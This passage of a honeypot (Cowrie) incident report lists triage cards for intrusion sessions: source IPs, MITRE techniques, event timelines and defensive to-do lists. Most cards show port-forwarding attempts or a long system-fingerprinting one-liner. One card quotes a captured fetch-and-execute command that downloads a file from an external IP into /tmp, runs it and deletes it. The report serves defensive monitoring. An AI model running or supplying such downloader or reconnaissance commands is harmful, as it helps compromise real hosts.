| `2026-08-15 19:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9446c3b2597

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-15 19:37 |
| **Last Seen** | 2026-08-15 19:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:37:47` | `cowrie.session.connect` |
| `2026-08-15 19:37:47` | `cowrie.client.version` |
| `2026-08-15 19:37:47` | `cowrie.client.kex` |
| `2026-08-15 19:37:48` | `cowrie.login.success` |
| `2026-08-15 19:37:49` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f18c6ec4263c

| Field | Detail |
|---|---|
| **Source IP** | `223.197.153[.]143` |
| **First Seen** | 2026-08-15 19:38 |
| **Last Seen** | 2026-08-15 19:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:38:19` | `cowrie.session.connect` |
| `2026-08-15 19:38:20` | `cowrie.client.version` |
| `2026-08-15 19:38:20` | `cowrie.client.kex` |
| `2026-08-15 19:38:22` | `cowrie.login.success` |
| `2026-08-15 19:38:22` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.153[.]143` to AbuseIPDB if not already reported
- [ ] Block `223.197.153[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b56e7bf8a9

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-08-15 19:38 |
| **Last Seen** | 2026-08-15 19:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:38:28` | `cowrie.session.connect` |
| `2026-08-15 19:38:29` | `cowrie.client.version` |
| `2026-08-15 19:38:29` | `cowrie.client.kex` |
| `2026-08-15 19:38:31` | `cowrie.login.success` |
| `2026-08-15 19:38:31` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f027b9c1eb

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 19:39 |
| **Last Seen** | 2026-08-15 19:39 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:39:11` | `cowrie.session.connect` |
| `2026-08-15 19:39:16` | `cowrie.client.version` |
| `2026-08-15 19:39:16` | `cowrie.client.kex` |
| `2026-08-15 19:39:38` | `cowrie.login.success` |
| `2026-08-15 19:39:51` | `cowrie.session.params` |
| `2026-08-15 19:39:51` | `cowrie.command.input` |
| `2026-08-15 19:39:56` | `cowrie.log.closed` |
| `2026-08-15 19:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0674628d6cd0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:39 |
| **Last Seen** | 2026-08-15 19:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:39:20` | `cowrie.session.connect` |
| `2026-08-15 19:39:20` | `cowrie.client.version` |
| `2026-08-15 19:39:20` | `cowrie.client.kex` |
| `2026-08-15 19:39:22` | `cowrie.login.success` |
| `2026-08-15 19:39:23` | `cowrie.session.params` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.success` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:23` | `cowrie.command.input` |
| `2026-08-15 19:39:24` | `cowrie.log.closed` |
| `2026-08-15 19:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f2880a8109

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-08-15 19:39 |
| **Last Seen** | 2026-08-15 19:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:39:55` | `cowrie.session.connect` |
| `2026-08-15 19:39:56` | `cowrie.client.version` |
| `2026-08-15 19:39:56` | `cowrie.client.kex` |
| `2026-08-15 19:39:57` | `cowrie.login.success` |
| `2026-08-15 19:39:58` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7786d97f63c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-08-15 19:40 |
| **Last Seen** | 2026-08-15 19:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:40:03` | `cowrie.session.connect` |
| `2026-08-15 19:40:04` | `cowrie.client.version` |
| `2026-08-15 19:40:04` | `cowrie.client.kex` |
| `2026-08-15 19:40:05` | `cowrie.login.success` |
| `2026-08-15 19:40:06` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171662680a7c

| Field | Detail |
|---|---|
| **Source IP** | `186.179.80[.]12` |
| **First Seen** | 2026-08-15 19:40 |
| **Last Seen** | 2026-08-15 19:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:40:09` | `cowrie.session.connect` |
| `2026-08-15 19:40:10` | `cowrie.client.version` |
| `2026-08-15 19:40:10` | `cowrie.client.kex` |
| `2026-08-15 19:40:12` | `cowrie.login.success` |
| `2026-08-15 19:40:13` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.179.80[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.179.80[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c627cb49e3

| Field | Detail |
|---|---|
| **Source IP** | `117.158.160[.]42` |
| **First Seen** | 2026-08-15 19:40 |
| **Last Seen** | 2026-08-15 19:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:40:23` | `cowrie.session.connect` |
| `2026-08-15 19:40:24` | `cowrie.client.version` |
| `2026-08-15 19:40:24` | `cowrie.client.kex` |
| `2026-08-15 19:40:27` | `cowrie.login.success` |
| `2026-08-15 19:40:28` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `117.158.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6589f7cd5547

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:41 |
| **Last Seen** | 2026-08-15 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:41:02` | `cowrie.session.connect` |
| `2026-08-15 19:41:02` | `cowrie.client.version` |
| `2026-08-15 19:41:02` | `cowrie.client.kex` |
| `2026-08-15 19:41:04` | `cowrie.login.success` |
| `2026-08-15 19:41:05` | `cowrie.session.params` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.success` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.command.input` |
| `2026-08-15 19:41:05` | `cowrie.log.closed` |
| `2026-08-15 19:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0060f9d132e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:42 |
| **Last Seen** | 2026-08-15 19:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:42:47` | `cowrie.session.connect` |
| `2026-08-15 19:42:48` | `cowrie.client.version` |
| `2026-08-15 19:42:48` | `cowrie.client.kex` |
| `2026-08-15 19:42:50` | `cowrie.login.success` |
| `2026-08-15 19:42:51` | `cowrie.session.params` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.success` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:51` | `cowrie.command.input` |
| `2026-08-15 19:42:52` | `cowrie.log.closed` |
| `2026-08-15 19:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f3ef7f5d53

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:44 |
| **Last Seen** | 2026-08-15 19:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:44:31` | `cowrie.session.connect` |
| `2026-08-15 19:44:32` | `cowrie.client.version` |
| `2026-08-15 19:44:32` | `cowrie.client.kex` |
| `2026-08-15 19:44:33` | `cowrie.login.success` |
| `2026-08-15 19:44:34` | `cowrie.session.params` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.success` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:34` | `cowrie.command.input` |
| `2026-08-15 19:44:35` | `cowrie.log.closed` |
| `2026-08-15 19:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc79f835a8c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-15 19:45 |
| **Last Seen** | 2026-08-15 19:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **Download Attempts** | hxxp://5.182.210[.]174/ok, hxxp://5.182.210[.]174/ok, hxxp://5.182.210[.]174/ok |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:45:35` | `cowrie.session.connect` |
| `2026-08-15 19:45:36` | `cowrie.telnet.option` |
| `2026-08-15 19:45:36` | `cowrie.login.success` |
| `2026-08-15 19:45:36` | `cowrie.session.params` |
| `2026-08-15 19:45:36` | `cowrie.telnet.option` |
| `2026-08-15 19:45:36` | `cowrie.telnet.option` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.failed` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.success` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.failed` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.success` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.failed` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.success` |
| `2026-08-15 19:45:36` | `cowrie.command.input` |
| `2026-08-15 19:45:36` | `cowrie.command.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download` |
| `2026-08-15 19:45:37` | `cowrie.session.file_download.failed` |
| `2026-08-15 19:45:39` | `cowrie.command.input` |
| `2026-08-15 19:45:39` | `cowrie.log.closed` |
| `2026-08-15 19:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9942c3a99c16

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:46 |
| **Last Seen** | 2026-08-15 19:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:46:11` | `cowrie.session.connect` |
| `2026-08-15 19:46:11` | `cowrie.client.version` |
| `2026-08-15 19:46:11` | `cowrie.client.kex` |
| `2026-08-15 19:46:13` | `cowrie.login.success` |
| `2026-08-15 19:46:15` | `cowrie.session.params` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.success` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.command.input` |
| `2026-08-15 19:46:15` | `cowrie.log.closed` |
| `2026-08-15 19:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d621768923d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:47 |
| **Last Seen** | 2026-08-15 19:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:47:46` | `cowrie.session.connect` |
| `2026-08-15 19:47:47` | `cowrie.client.version` |
| `2026-08-15 19:47:47` | `cowrie.client.kex` |
| `2026-08-15 19:47:48` | `cowrie.login.success` |
| `2026-08-15 19:47:49` | `cowrie.session.params` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.success` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.command.input` |
| `2026-08-15 19:47:49` | `cowrie.log.closed` |
| `2026-08-15 19:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19d246539ce

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-15 19:49 |
| **Last Seen** | 2026-08-15 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:49:20` | `cowrie.session.connect` |
| `2026-08-15 19:49:20` | `cowrie.client.version` |
| `2026-08-15 19:49:20` | `cowrie.client.kex` |
| `2026-08-15 19:49:21` | `cowrie.login.success` |
| `2026-08-15 19:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde8e79693ed

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-15 19:49 |
| **Last Seen** | 2026-08-15 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
